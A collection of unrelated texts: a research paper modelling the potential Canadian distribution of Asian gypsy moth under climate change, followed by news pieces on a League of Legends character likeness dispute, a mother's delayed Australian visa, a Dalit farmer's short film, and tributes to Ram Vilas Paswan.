It is currently spreading across North America, damaging forest ecosystems and posing a significant economic threat. Two subspecies L. d. asiatica and L. d. japonica, collectively referred to as Asian gypsy moth (AGM) are of special concern as they have traits that make them better invaders than their European counterpart (e.g. flight capability of females). We assessed the potential distribution of AGM in Canada using two presence-only species distribution models, Maximum Entropy (MaxEnt) and Genetic Algorithm for Rule-set Prediction (GARP). In addition, we mapped AGM potential future distribution under two climate change scenarios (A1B and A2) while implementing dispersal constraints using the cellular automation model MigClim. MaxEnt had higher AUC, pAUC and sensitivity scores (0.82/1.40/1.00) when compared to GARP (0.70/1.26/0.9), indicating better discrimination of suitable versus unsuitable areas for AGM. The models indicated that suitable conditions for AGM were present in the provinces of British Columbia, Ontario, Quebec, Nova Scotia and New Brunswick. The human influence index was the variable found to contribute the most in predicting the distribution of AGM. These model results can be used to identify areas at risk for this pest, to inform strategic and tactical pest management decisions. Forest Invasive Alien Species (FIAS) are of serious concern to biodiversity around the world and their impacts on native plant species, communities, and on associated environments are widely recognized to have both economic and ecological impacts1,2. In Canada, over 80 Forest Invasive Alien Species (FIAS) have been introduced since 1882, most notably Dutch elm disease, white pine blister rust, rusty tussock moth, Asian longhorned beetle, emerald ash borer and European gypsy moth3. It is estimated that these FIAS destroy roughly 400,000 hectares (ha) of forest every year4. The establishment of FIAS has continued to rise5,6, and their impacts are anticipated to be substantial throughout all environments7,8. Moreover, the global, national, and regional spatial patterns of FIAS invasions in the future are likely to be different due to technological advances in transportation and international trade9, increase in human population10, and climate change11. Gypsy moth (Lymantria dispar L.) is listed as one of the 100 worst invasive alien species in the world, selected from global invasive species database by the International Union for Conservation of Nature (IUCN). Gypsy moth can cause serious defoliation and weakening of trees and shrubs, that either leads to tree death directly or indirectly by subsequent infestation by a secondary pest. Currently, gypsy moth is spreading in North America (primarily in the United States) damaging both commercial and native forest ecosystems over much of the introduced range. The pest also poses a significant economic threat to several other countries that are taking actions to prevent its introduction12. Two subspecies, Asian gypsy moth (L. dispar asiatica Vinkovskij), distributed throughout temperate Asia, and the Japanese gypsy moth (L. dispar japonica Motschulsky), distributed throughout Japan, are of serious concern although they have not yet permanently established (though several incursions have been eradicated) outside their native range13,14. The two subspecies, L. d. asiatica and L. d. japonica here after collectively referred to as Asian gypsy moth (AGM) have a broad host range (over 600 plant species, including conifers) and the females are flight capable15. They have an affinity to fly towards light sources and strong dispersal traits, which makes them a greater threat than their European counterpart. The AGM females have been found to fly to lights in port areas and lay their egg masses on cargo and the superstructure of ships. A study by Paini et al.13,14 found that more than 7,500 ships that have the potential to carry AGM egg masses from Asia arrived in 2005 at Canadian ports that fall into the climatically suitable range of AGM. Several detections of AGM egg masses on vessels coming from Asian ports have occurred in Canada (the first eradication effort occurred around the Vancouver port in 199216) which have led to the implementation of international phytosanitary measures to prevent AGM establishment that are significantly reducing the risk of invasion. Because there is a continuing risk of introduction, it is important to predict potential distribution and factors that influence their ability to establish17. Species distribution models (SDMs) are commonly used to provide information on potential distribution range of FIAS, which in turn is critical for conservation and management planning and for understanding FIAS ecology18. SDMs build on the general concept of a fundamental niche and forecasted species distributions that are dependent on the underlying modelling algorithm that is applied19. SDMs are trained with species occurrence data and associated environmental layers from one range, and then projected onto a different range in order to identify regions with relative environmental suitability for a given FIAS. The theory behind this method is the similarity between native and non-native regions of the FIAS20. In the past, researchers have used both correlative (GARP) and partially-mechanistic (CLIMEX) approaches to predict the global potential distribution range of AGM13,14. Peterson et al.14 used the Genetic Algorithm for Rule-set Prediction (GARP) whereas Paini et al.13 used CLIMEX to map global climate suitability for AGM. These studies looked at global species distributions of AGM with no study focused on a Canada-wide scale. We therefore aimed to compare two SDM approaches, MaxEnt and GARP, to check if they provide reliable distribution estimates in AGMs native range and realistic potential distribution maps for AGM in Canada. MaxEnt and GARP are capable of providing robust predictions with presence-only data and have often outperformed classical modeling approaches, such as domain, bioclim, and logistic regression21. Only a few studies have reported mixed performances of GARP and MaxEnt with respect to their predictive success in unsampled regions22,23. To support improved future surveillance of AGM, we also investigated the null hypothesis that there would be no difference in the potential habitat of AGM under changing climates. To do this we used the two SDMs (MaxEnt and GARP) we had developed and mapped potential distribution of AGM in Canada under two climate change scenarios A1B and A2. Basically, the A1B scenario is characterized by a very rapid economic growth, low population growth and rapid use of more efficient technology whereas, the A2 scenario refers to a heterogeneous world with high population growth and less concern for economic development24. Modelling results for AGM distribution from GARP and MaxEnt showed a similar distributional pattern in the species’ native range. However, different suitability scores were obtained from both SDMs. GARP assigned larger areas a high suitability score than MaxEnt (Fig. 1). Areas in which modelling results are in agreement, include Japan, North and South Korea, central and western parts of Russia, eastern and southern China, Indo-Himalayan range, Laos, Parts of Indonesia and Papua New Guinea, Kyrgyzstan, Tajikistan, Northern Afghanistan and Kazakhstan, Turkey and the north-western regions of Iran. Additionally, suitability was considered high in southern parts of India and Sri Lanka. These predictions are well in agreement with the occurrence records found in the literature25. Predicted potential distribution of AGM in Asia and Canada, using GARP and MaxEnt. For Asia, higher probability (red colors) represent areas suitable for AGM. Zero probability or lower probability (dark green) indicates areas less suitable. Whereas, for Canada the continuous suitability values (0–1) from GARP and MaxEnt outputs were classified as: very low (0–0.25), low (0.25–0.50), medium (0.50–0.75) and high (0.75–1.00) for easy interpretation and comparison purposes. Predictions obtained from transferring these models to nonnative range (in Canada) using both approaches however, did show substantial differences (Figs. 1 and 2). Potential distribution (enlarged view) of AGM using GARP and MaxEnt in Canada at 20 km2 spatial resolution. Areas modelled to be highly suitable using GARP were found in British Columbia (BC), Alberta, Saskatchewan, southern regions of Manitoba and Ontario (excluding Toronto) and parts of Quebec, Nova Scotia, Prince Edward Island and Newfoundland. MaxEnt results identified coastal BC, areas around cities of Vancouver and Toronto, Southern Quebec, Prince Edward Island, Nova Scotia and southern parts of New Brunswick and Newfoundland to be of high suitability. Differences between the distribution predictions was recorded for all suitability classes across Canada, with major differences observed in Manitoba, Saskatchewan and Alberta (Figs. 1 and 2). Similar patterns of predicting higher suitability scores for larger regions was recorded from GARP across the entire nonnative range. The occurrence data and modelled distributions indicate that areas receiving annual precipitation between 800 and 3,800 mm and a mean annual temperature range of 5 to 25 °C are suitable for AGM establishment. These areas have HII index value above 25 (Fig. 3) and cover a large range of climatic zones (Table 1). Relationships between environmental predictors and the probability of the presence of AGM: Red curves show the mean response and blue bands around them are ±1 standard deviation calculated using 10 independent data subsets. The jackknife test identified the Human Influence Index (HII) and annual precipitation (Bio 12) as the most important predictors of AGM distribution (Fig. 4). HII made the largest contribution to the MaxEnt model of AGM distribution when used in isolation and reduced the model’s predictive ability the most when omitted. HII, annual precipitation and seasonality of precipitation were the strongest predictors of AGM potential range contributing 46.5, 26.2 and 17.8% respectively, showing that in addition to precipitation, anthropogenic factors can have a huge impact on the distribution of this species. Jackknife test for AUC of environmental variable importance for the MaxEnt model. The AUC, pAUC and sensitivity scores for MaxEnt and GARP models were higher than 0.7, 1 and 0.8 suggesting that both of the approaches had good predictive capability (interpolation). However MaxEnt had higher AUC, pAUC and sensitivity scores (0.82, 1.40 and 1) compared to GARP (0.70, 1.26 and 0.9) indicating better discrimination of suitable versus unsuitable areas for AGM. MigClim simulations show that at the end of simulation run (i.e. the potential distribution of AGM under specified dispersal restrictions) a total of 16,450 cells were colonized in the A1B scenario, whereas 16,654 cells were colonized under A2 scenario (Fig. 5). Dispersal restricted future distribution of AGM under A1B and A2 climate change scenarios. Color gradient from rose to dark red represents first 10 years of the simulation timeframe when colonization first occurred, the light sand to cherry red color gradient represents the next 10 years followed by green and sky blue color gradients (years 2031–2050). Red pixel indicates the hypothesized point of AGM introduction while the dark grey pixels represent suitable areas that were not colonized due to dispersal limitations. In the first 10 years of the modelling timeframe, areas in coastal BC, around Vancouver, Duncan, Port Alberni, Courtenay, Quesnel and Williams Lake are likely going to provide suitable habitat to AGM. In next 10 year period (years 2021–2030) areas east of Kamloops, Kelowna and Prince George will provide suitable habitat for AGM dispersal and establishment. Areas around Prince Rupert and Terrace may also be suitable in the same period. Under the A2 climate change scenario the potential area colonized during the second and third 10 year timeframes would be larger compared to A1 scenario. In 2031–2050, areas south of Whitehorse near Teslin and Juneau, as well as areas around Watson Lake would be expected to be colonized. Areas around Graham Island and Moresby Island including Naikoon Provincial Park (PP) and Gwaii Haanas National Park (NP) and NP situated southwest to Whitehorse (Kluane) and Tatshenshini-Alsek PP may not get colonized due to dispersal limitations. Both modelling approaches predicted large areas suitable for AGM in Canada. These findings are similar to studies conducted in the past by Peterson et al.14 and Paini et al.13. GARP and MaxEnt performed well for AGM’s native range with relatively high AUC, pAUC and sensitivity scores. However MaxEnt out performed GARP in determining potential distributions of AGM in the native range. This finding is in line with other studies that found MaxEnt outperforming alternative approaches18,26. We found GARP to overestimate suitable areas in both native (e.g. Russia and Indo-Himalayan range) and nonnative range of AGM (e.g. Yukon, Nunavut, Alberta and Saskatchewan). In contrast MaxEnt predictions were close to the known distributional range of AGM in the native range. Since AGM is not currently established in Canada, we did not have any data to test transferability success of the approaches. As a surrogate for AGM we compared the predictions from both models by overlaying interception location records of EGM (European gypsy moth) provided by the CFIA (collected as a part of annual pest survey), since EGM and AGM are assumed to have similar ecological characteristics and hosts27,28. We found that MaxEnt predictions matched more closely to EGM distributions in Canada than GARP. The better performance of MaxEnt can be attributed to its ability to fit complex functions including interactions amongst predictors and use of penalty functions to avoid overfitting29. GARP predictions are often criticized for overestimating the distribution range26 as it tends to omit less important relationships in the data (temperature, in our case)30. Our results indicated that the total suitable area for AGM will increase in the A2 scenario, which led to a rejection of our original hypothesis –that there would be no difference in the potential habitat of AGM under a changing climate. Climate models have projected that by 2100, eastern Canada will be approximately 3–5 °C warmer, with increased winter precipitation31, this rise in temperature which could eventually lead to much higher probabilities of AGM invasions. Suitable conditions for AGM were modelled in areas with annual temperatures between 5 and 25 °C, but the optimum range (probability of presence >0.60, based on maximum test sensitivity and specificity threshold32) was between 11–25 °C. This optimum range is in agreement with the recent findings of Limbu et al.12 that AGM populations may struggle in regions that experience longer periods of temperatures ≥30 °C and that AGM survival was highest between 15 and 25 °C. Canadian areas classified as suitable were located within the Koppen-Geiger climatic zones- DFb (average temperatures below 22 °C) and DFc, which represents subarctic climate where 1–3 months have an average temperature above 10 °C. We included an additional variable HII to account for dispersal and human footprint and found that it contributed the most to determining the distribution of AGM. Areas predicted to be suitable had HII values above 25. This backs the notion that FIAS distributions are heavily impacted by the influence of humans on the landscape33 and that human activity can significantly affect the distribution of FIAS. The AGM distribution maps generated by our models were different from those produced by Peterson et al.14 and Paini et al.13, who found large areas in Alberta, Saskatchewan and Manitoba to be suitable while our MaxEnt model showed only limited suitability in these provinces. This could possibly be due to the following limitations of these studies: (1) GARP has been criticized for over predicting distribution ranges18 and failure to model less important relationships in the data30. Additionally GARP has been also found to be less accurate than MaxEnt in several studies34. (2) Bioclimatic variables included in the SDMs by Peterson et al.14 did not account for anthropogenic impacts on the response variable (probability of species occurrence). (3) The authors have ignored the dispersal limitations of the FIAS in the modelled distributions. This is despite the fact that FIAS invasions increase as dispersal capabilities increase, often aided by human activities35. (4) It is important to constrain the pseudo-absence (PA) locations to the same geographic range as presences for accurate predictions36, however this approach was not followed by Peterson et al.14 while selecting PA samples. These findings suggest that pest surveillance in these provinces may need to be reevaluated. These spatial uncertainties of the individual models can be minimized by adopting a machine learning approach based on combining multiple models, but this does have limitations. The ensemble approach may misinterpret suitability if individual model predictions overestimate the species potential range. However, if occurrences from nonnative ranges were available for validating the models, this could increase the predictive power resulting in more refined predictions. Additionally, our predictions could have been improved if we adopted a hybrid approach that includes fitting the SDMs with existing ecological knowledge. Recently, development of Bayesian SDM using Gaussian process (GP) by Golding and Purse37, enables the user to incorporate prior ecological knowledge via a prior estimate of a model function. Correlative SDMs (MaxEnt and GARP) are focused primarily on the realized niche and in turn, are capable of representing only a part of the fundamental niche. Additionally, when dispersal is not included into habitat projections, potential habitat and colonizable habitat can differ significantly38. This can lead to a great deal of uncertainty when deciding on resource allocation for FIAS control measures and further lead to huge economic losses. Our approach of addressing dispersal limitations using MigClim allows simulating FIAS spread for a set of anticipated future climate change conditions while integrating species-specific genetic traits (flight capacity, long dispersal distance, etc.). We have found suitable areas where AGM is likely to spread if it gets introduced and establishes in Vancouver. Such information can be used by managers to more finely focus eradication efforts. Due to increasing trade, climate change, and a lack of established gypsy moth natural enemies, Canada’s forests are under acute risk of being invaded by AGM4,39. A recent study by Paini et al.13 found a total of 7,662 ships arriving at Canadian ports in 2005 which came to Canada directly from a port in a region where AGM is able to establish. Thus, maps produced from this study will help in providing information about the potential suitable distribution ranges of AGM for formulating effective mitigation strategies and aid in designing pest surveys and domestic quarantines. However, the maps produced should be interpreted with caution as there is no best transferable SDM for all species40 and predictions differ with varying modelling assumptions. Also, AGM infested ships could arrive to any other vulnerable port and not just Vancouver, thus additional simulations under multiple scenarios of dispersal at various points of entry are still needed. In order to meet the objectives the following steps were taken, that will be described in detail below: AGM occurrence records were collected from several sources. Spatial datasets representing current and future climate (A1B and A2) were developed alongside spatial information on the human footprint in the area of interest. Both a MaxEnt and GARP model were built to simulate the potential distribution of AGM in Asia and Canada. Dispersal limited projection of future AGM distribution under A1B and A2 climate change scenarios were produced using MigClim. Conceptual and analytical flowchart of present study is shown in Fig. 6. Flowchart representing the modelling flow used to model Asian gypsy moth distribution in this study. To compare the performances of MaxEnt and GARP and in order to map the potential distribution of AGM, we collected presence records of AGM in its native range from various sources. The sources included (1) Global Biodiversity Information Facility database, an online database for species occurrences; (2) Records provided by the Canadian Food Inspection Agency (CFIA); and (3) Scientific articles and maps. We deleted duplicate records such that each observation falls inside a separate 20 km grid cell, leading to a total of 78 distinct occurrence records (Fig. 7). Our collected records cover a large proportion of the species’ native range and shows that AGM can survive under various climatic conditions (Table 1). Occurrences of Asian gypsy moth. The shaded region represents the background used for creating the SDM based on a buffered minimum convex polygon. The Köppen-Geiger climate classification (vegetation-based) system40 was used as a background. This is done to allow assessing risk based preliminary on whether a species is found in the same climate zone as the pest risk assessment area. Nineteen layers of bioclimatic data on current and future climatic conditions, A1B (moderate increase in global surface warming) and A2 (higher increase in global surface warming) were obtained from CLIMOND at 20 km spatial resolution41. Additional data on human footprint “Human Influence Index-HII” at 1 km and vegetation based Köppen-Geiger climatic zones at 20 km were obtained from SEDAC42 and CLIMOND41 respectively. The Human Influence Index (HII) is a measure of direct human influence on terrestrial ecosystems, derived from nine global variables including land cover, population density, built-up areas, roads, navigable rivers and nighttime lights43. All predictor variables were resampled to 20 km resolution using a bilinear interpolation in WGS84 projection and were clipped in ArcGIS v 10.344 to the native (Asia) and nonnative range (Canada) of AGM to allow model projections via SDM transfer. Further, these predictors were subjected to multicollinearity test using Pearson’s correlation coefficient (r), as the real relationship between species occurrences and environmental layers will not appear in case of heavy auto correlated variables. Therefore, we selected only one variable from each set of highly correlated variables (r > 0.7) depending on its biological relevance to the species and relative contribution to the overall model and finally selected six environmental variables: Bio1 (Annual mean temperature), Bio2 (Mean diurnal temperature range), Bio12 (Annual precipitation), Bio15 (Precipitation seasonality), HII (Human influence index) and Climatic zones for our SDM. In this study, we used two species distribution modelling algorithms, MaxEnt and GARP to map current potential distribution of AGM. These models differ both conceptually as well as statistically and are capable of accommodating complex nonlinear functions to model the relationship between species presence and predictors45. Both MaxEnt and GARP were built separately using native occurrences and were later projected onto Canada to map potential suitable areas for AGM establishment. MaxEnt is a machine learning algorithm used for describing probability distributions following the principle of maximum entropy, subject to restraints imposed by presence of species and their surrounding environment21. The entropy is defined by the following equation: where π is the unknown probability distribution; \(\hat{{\rm{\pi }}}\) is the approximation of π; X is a finite set; x is an individual element in set X; and ln is the natural logarithm. The entropy is nonnegative and is at most the natural log of the number of elements in X. GARP, the Genetic Algorithm for Rule-set Prediction, works in an iterative process of rule selection, evaluation, testing and incorporating or rejecting rules to produce a heterogeneous set summarizing a species ecological requirement46. These sets of rules are combined in a random way to generate the potential habitat of the species restricted by the environmental conditions47. MaxEnt software version 3.3.3 k was used to map potential distribution of AGM. Eighty percent of the occurrence data was portioned into ten random subsets and using in the k-fold cross validation function of MaxEnt. This was done to evaluate the average behavior of the model26. 10,000 pseudo-absences (PAs) were generated for model training and evaluation within an area defined by a minimum sized convex polygon encompassing occurrences in the native range using SDM toolbox48 (Fig. 7). The output predictions were based on default parameter values (0.01 convergence limit, and 1,000 maximum iterations). In order to produce simple models with smooth fitted functions we used only hinge features20. We optimized the multiplier value following an approach by Padalia et al.18. Jackknife resampling was used to identify those variables that contributed most to the model. The method provides systematic resampling and leads to improved estimates of the sample parameter and a lower sampling bias49. The mean values of relative contribution of the environmental variables were calculated from 10 MaxEnt modelling runs. The model runs were performed using cross-validation function in MaxEnt. Additionally, the fade by clamping function was used to limit extrapolations beyond the environmental range of the training data50. We used the “openModeller” software package51 to implement GARP as our second SDM. The “best subset” selection procedure was used using the new openModeller implementation with default parameters. The rule sets were projected onto environment layers of Asia and Canada to generate predictions of AGM distributions. The outputs of MaxEnt and GARP with habitat suitability values ranging from 0 (unsuitable) to 1 (optimal habitat) was recorded for both native and nonnative range. Habitat suitability for nonnative range (Canada) was further classified as very low (0–0.25), low (0.25–0.50), medium (0.50–0.75) and high (0.75–1.00) for easy interpretation and comparison purposes. The cut off threshold for species presence and absence was obtained from maximizing test sensitivity and specificity32 and was used for the suitability classification. Presence records of European gypsy moth were also overlaid on the classified map to ensure the reliability of used classification. Model evaluation was performed using the remaining 20% of the presence data for AGM in the native range. Area under the curve (AUC) of the receiver operating characteristic, partial AUC ratio (pAUC), and sensitivity (fraction of correctly predicted presences) values were calculated using the above independent dataset. AUC provides a single measure of model performance independent of any particular choice of threshold. The AUC measures model performance that ranges from 0 to 1. A model performs well when the AUC is large. Usually, AUC values of >0.9 indicate high accuracy, values between 0.70 and 0.9 indicate good accuracy, and values between 0.5 and 0.7 indicate low accuracy52. In the past, authors have found the AUC test inappropriate for presence only models53 since it assigns similar weight to both commission and omission errors. Therefore we also used partial AUC (pAUC) as a second evaluation method. Here, the region of Receiver Operating Characteristic (ROC) space, where the omission error is less than the user defined variable (E), is considered for calculating partial AUC54. A pAUC value of >1.0 shows better performing model. We extracted the same number of PAs as testing presences in order to calculate the evaluation scores. PAs were extracted in the same spatial range as the presences. Partial AUC ratio and sensitivity were calculated at 0% omission rate. AUC and pAUC scores were calculated using “ROCR” R package55 and “NicheToolBox56” respectively. In order to include AGM specific dispersal constraints into projections of its potential distributions under climate change, we used MigClim57. MigClim is a function library built in R software58 that allows implementation of species dispersal limitations in SDM predictions under climate change conditions. MigClim is a cellular automaton model so cells are the measured units and here each cell corresponds to 20 km square pixel. Since MigClim does not generate habitat suitability maps itself, we used MaxEnt to generate the required inputs. Future AGM distribution maps for the year 2030 and 2050 were produced for climate change scenarios A1B and A2 using MaxEnt. These maps were used as an input along with an initial distribution map of AGM. We assumed the initial infestation point was Vancouver port since the species was able to reproduce there in the 1990’s resulting in an eradication. We chose a reclassification threshold of 0.5 along with a dispersal kernel of 1 and 0.5, since females fly on average less than 1 km (maximum range of 20–40 km). AGM long distance dispersal frequency was set to 0.1 and min-max distance range as 100 (5 cells) and 200 km (10 cells) respectively59. Propagule production potential was set to 1. We had two environmental change steps (2030 and 2050) where each environmental change step had 20 dispersal steps. Accordingly the total number of dispersal steps simulated was equal to [envChgSteps] × [dispSteps], here 40, which corresponds to 40 years from 2010 to 2050. The simulations were repeated for 10 year timeframes producing dispersal limited future distribution maps of AGM from 2010 to 2050 under A1B and A2 climate change scenarios.

With her vibrant pink hair and signature specs, Seraphine is about as unique as they come in terms of Champions. If a fictional character was based on you, we're pretty sure you'd know about it - but when it comes to ""Stephanie"", she thinks the character has stolen her likeness. Posting on Medium, Stephanie explained her personal journey and why Seraphine is a problematic newcomer to LoL. The crux of the matter goes back to Stephanie's brief relationship with a Riot Games employee in 2019. She's confident this led to her likeness being used to create the K/DA pop princess. In the lengthy story, Stephanie spoke about her relationship with ""John"". She explained, the pair had a mutual love of LoL, while John came up with Stephanie-inspired skin ideas for her favourite character, Ahri. She said she visited the Riot Games studio and was given artist drawings of herself as Ahri, which she said was ""strange"". She continued to claim John wanted her to provide the voice for a top-secret project which she thinks was Seraphine. Despite her and John going their separate ways, Stephanie said she was shocked to see Seraphine's reveal (which was also the same day as her birthday). Stephanie said, ""As soon as I saw what she looked like and realised she was going to be a League champion, I started scrolling through her accounts, completely freaked out. My worries only grew, and my heart sank more and more with every post"". Stephanie went on to point out how a lot of her poses seem to match Seraphine and how she thinks her cat was the inspiration for Seraphine's. Instead of putting the blame at John's door, she's instead pointing at Riot. She concluded, ""It's a quaint idea, but when you think about it more closely, the idea of a marketing team in some office in Los Angeles trying to sell a product by coming up with the most ~relatable~ and marketable things to tweet out of the account of a 'girl' who coincidentally looks like me, and talks like me, and sounds like me, and draws like me? It just makes me sick"". Despite having ""no way to conclusively prove"" Seraphine is based on her, Stephanie is standing by her story. Is there more to this twisted tale though? Stephanie's accusations have caught the attention of Riot Games, which has now issued a statement on the matter.  Despite some thinking there's a lot to Stephanie's claims, Riot maintains there's nothing untoward going on. A Riot spokesperson told PC Gamer, ""Seraphine was independently created by Riot Games and was not based on any individual. Additionally, the former employee [Stephanie] is referring to left Riot more than a year ago and was in a department and role that has no input whatsoever into the creative design process"". In October, Senior Game Designer Jeevun Sidhu cited that his wife was the main influence for Seraphine. Also, last month, Stephanie's lawyer sent a legal demand to Riot Games. The defence has said Stephanie's claim â€œlacks meritâ€ and has invited her side to â€œfurther discuss the facts"". While Stephanie thinks Seraphine is based on her, Riot is sticking to its guns and is adamant this is just a simple coincidence.

Xiao Li, 22, was in Australia on a working holiday visa before his car collided with a truck in Gippsland, Victoria on January 27, leaving him in critical condition. His mother Xing Lan Ren, who lives in China, wanted to see her only son before he passed away but her visa was not approved in time. On Monday, Xiao Li was declared brain dead in the Intensive Care Unit of Royal Melbourne Hospital but his mother's visa was only approved on Friday. Mother Xing Lan Ren, who lives in China, wanted to see her 22-year-old son Xiao Li in Melbourne before he passed away but her visa was not approved in time After the crash, Ms Ren payed $1,415 to fast track her visa application, which normally takes two working days. However, three days later Prime Minister Scott Morrison announced a two-week ban on foreign arrivals from mainland China in order to stop the spread of coronavirus. Mrs Ren was shocked by the news and told a local Chinese-language publication that she just wanted to say goodbye to her only son. 'My family is completely in the dark, and now I just want to see the [son] for the last time, but Australia has issued a travel ban,' she told Sydney Today. 'I really don't know what to do.' Family friend Simon Lee started a Change.org petition pleading for Ms Ren and her brother Shi Luming to be allowed into the country. The petition was directed at Federal MP Gladys Liu and garnered almost 3,000 signatures. 'We pledge that the temporary visa of Mrs Ren and Mr Shi to be granted so they can visit Mr Li (son of Mrs Ren and nephew of Mr Shi) in the Intensive Care Unit of Royal Melbourne Hospital; and Mrs Ren and Mr Shi to be allowed enter to Australia despite the travel restrictions,' it read. On Monday, Xiao Li (pictured) was declared brain dead in the Intensive Care Unit of Royal Melbourne Hospital but his mother's visa was only approved on Friday On Friday, acting Immigration Minister Alan Tudge announced Ms Li's visa had been granted on Twitter. 'I’m pleased to confirm that the mother of Xiao Li has been granted a visa to Australia,' he wrote. 'The Government will work with her during this extremely difficult time and to ensure she can see her son as quickly as possible without putting the Australian public at any risk.' Mr Li arrived in Queensland on a working holiday visa one year ago, where he worked on a farm before moving to Victoria. Currently, there are 15 cases of coronavirus in Australia and 636 deaths from the disease in mainland China. On Friday, acting Immigration Minister Alan Tudge announced Ms Li's visa had been granted on Twitter NEW SOUTH WALES: 4 January 25 January 27 VICTORIA: 6 January 25 January 29 January 30 February 1 February 22 QUEENSLAND: 8 January 29 January 30 February 4 February 5 February 6 SOUTH AUSTRALIA: 3 February 1 WESTERN AUSTRALIA: 1 February 21   JAPAN: 15     Share what you think The comments below have been moderated in advance.

In his fifties, the Dalit farmer in Raipur Sadat, a village in Bijnor district, is directing his first film, Maa. The 13-minute short about the pain of losing one’s mother becomes even more intriguing when you find out that is that it is nestled within a larger documentary, Taraash. Kunwar had always wanted to be a Bollywood director and work with his muse Sridevi, but his modest means and familial responsibilities held him back. It however, didn’t stop the father of six kids from writing six feature-length scripts and many short stories. For decades, people found his passion amusing or downright crazy—even his wife hadn’t read his stories. In 2017, however, his wish finally materialised after a chance encounter with Ishan Siddiqui, then a 20-year-old media student at University of Leeds.  “I was visiting my family in Nagina, my ancestral village,” says Ishan. “I heard about a man in the neighbouring village who wanted to meet me after he found out that I was studying film. As soon as we met, he asked me if I knew any big directors in Bollywood and said, ‘You just take me along, I’ll do the talking…they will love my scripts.’ His determination and confidence inspired me to explore his extraordinary story.” Ishan helped Kunwar make Maa and chronicled the collaboration in his 20-minute film Taraash. “I polished his script and adapted it to a short film as Kunwar mainly writes feature-length scripts. I also shared my creative inputs on Maa. During the shoot, he would direct the actors and we would go through the rushes at the end of the day.” While the interviewees and actors in the film were largely locals, he cast three professional actors from Delhi as Maa’s protagonists. The result is a crisp metanarrative weaving fiction and non-fiction that revels in the art and effort of making a film. While the crew for both films is the same, the visualisation is different—in Maa, the aspect ratio is wider, the colours starker and the background score more pervasive. Despite the different treatment of the ‘fictional’ and the ‘documentary’, Taraash suddenly intercuts between the two—the fictional mis-en-scene often gives way to the behind the scenes, with the crew, camera and a crowd of onlookers visible in the frame. However, it is more than just a film of the ‘making of’ genre. Ishan not only shoots Kunwar shooting Maa, but also Kunwar and the people in the village watching Maa and their reaction to the movie. Jean Rouch pioneered this cinema vérité technique in Chronicle of a Summer (1961). More recently, in The Act of Killing (2012), director Joshua Oppenheimer asked some perpetrators of the 1965-66 anti-Communist massacres in Indonesia to recreate the murders on film and documented their reactions to the videos they shot.  Ishan acknowledges these directors’ influence: “They taught me the essence of non-fiction filmmaking through collaboration with subjects rather than intervention. I gravitate towards cinema vérité as I enjoy collaboration. As opposed to the ‘fly on the wall’ format [where the crew shoots subjects with minimum interference], I love getting into the thick of things. I also want actors and interviewees to contribute their ideas. For instance, while speaking to Kunwar about Maa, I realised the story was more personal than it initially seemed. I felt like he was using the film to express his feelings towards his mother. So, I wanted him to live his fantasy and share his truth the way he wanted. Sometimes, something as fake as fiction can bring out the true character of a person.” Kunwar’s character is what makes the film exceptionally delightful. His earnestness and passion for storytelling suffuses every scene. Despite his age and financial constraints, he has a childlike playfulness. “I can write a story instantly. If you want, I can make one on your cameraman,” he declares to Ishan. “I will set it in London and Delhi…shall I show some romance here or there?” he adds with an impish smile. Kunwar is happy with his directorial venture, but he wants more. “If we extend this, it will look amazing,” he says as he watches Maa. Ishan too would have liked Taraash to be feature-length, but as a student film, there were many constraints. “As Raipur Sadat is a religious area [the Najaf-e-Hind dargah is nearby], it was difficult to get the permission to shoot and organise screenings. After the local police stopped us from filming, I, along with my cousins, went to the District Magistrate and Senior Superintendent of Police and sought their support,” says Ishan. “The core crew spoke only English, so the Indian crew had to help translate and liaise. Crowd control was also a challenge, but we had the support of village residents and my family members. They helped manage onlookers and avoid chaos.” Taraash was shot over two-and-a-half weeks and funded with a Kickstarter campaign that garnered slightly more than its goal of £4,000 with 66 backers. Towards the end of the film, Kunwar says, “As long as I breathe, I will keep writing. This is my dream. One day, I will find a way.” As his passion lights up the screen, one can’t help but wonder how many more Kunwars must be cultivating films in their imaginations and screenplays in their tattered notebooks. Taraash has been shortlisted for LongShots, BBC’s first online film festival."

Former prime minister Manmohan Singh on Friday said the country has lost one of the greatest Dalit and socialist leaders in Ram Vilas Paswan. Paswan (74), the Union Minister for Consumer Affairs, Food and Public Distribution, died at a hospital in Delhi on Thursday, days after he underwent a heart surgery. Former Congress president Rahul Gandhi also paid his last tributes to the departed leader and visited the latter’s place. Gandhi said Paswan raised voice for the most marginalised sections in society and left a lasting imprint on politics and public service in both Bihar and the country. In a letter to Chirag Paswan, son of the late Union minister, Manmohan Singh described him as an important Dalit face in the central government. ""In his death our country has lost one of its greatest Dalit and socialist leaders, who always stood for the cause of the poor and downtrodden people of the society,"" Singh said in his condolences. ""Ram Vilas Paswan ji was a very important Dalit face in the central government, of many parties. I have very warm recollections of my association with Shri Paswan ji as a member of the UPA Government which I led in 2004. ""The veteran socialist leader, Paswan ji was also a very efficient administrator who worked very closely with me as Minister of Chemicals and Fertilisers, and also served as minister in various ministries,"" the former PM said. Singh said Paswan was a mass leader which is evident from the fact that he won Parliament elections with a record majority from his constituency. He said Paswan was also a leader who was loved and respected by all with whom he came into contact with, irrespective of their political leniency. Rahul Gandhi, in a letter to Chirag Paswan, said he was deeply saddened by the sudden demise of his father. ""We have lost a veteran leader who left a lasting imprint on politics and public service in both Bihar and our nation. ""In an illustrious public life spanning over five decades, he was the voice of the most marginalised sections of our society and defended the rights of the poor and the vulnerable,"" he said in his letter. Gandhi said as a Member of Parliament and Union minister, Paswan voiced the interests and concerns of the poor with passion. ""His unwavering commitment to social justice and equality is particularly relevant in these times. His enduring legacy will continue to inspire people dedicated to public service,"" the Congress leader added.

